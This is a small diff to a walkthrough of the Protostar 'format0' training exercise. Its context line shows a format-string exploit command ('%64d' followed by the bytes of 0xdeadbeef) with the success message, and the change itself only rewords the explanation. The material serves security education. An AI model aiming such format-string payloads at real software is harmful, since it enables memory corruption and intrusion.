@@ -70,4 +70,4 @@ user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print '%64d' + '\xef\x
 you have hit the target correctly :)
 ```
 
-Since there are no format arguments but format specifier **%64d** is provided so it will execute 64 spaces to fill the **buffer** variable then append the **deadbeef** string/word.
+Since there are no format arguments but format specifier **%64d** is provided so it will execute 64 spaces to fill the **buffer** variable then append the **deadbeef** string.
